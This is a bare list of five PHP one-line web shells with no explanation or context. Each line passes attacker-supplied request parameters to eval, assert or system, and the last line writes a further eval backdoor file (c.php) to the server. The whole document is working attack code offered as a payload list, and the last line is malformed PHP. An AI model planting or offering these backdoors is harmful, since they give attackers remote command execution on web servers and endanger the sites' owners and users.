<?php eval($_POST[sb])?>

<?php @eval($_POST[c])?>

<?php system($_REQUEST['cmd']);?> 

<?php assert($_POST[c]);?>

<?fputs(fopen(c.php,w),<?eval($_POST[c]);?>)?>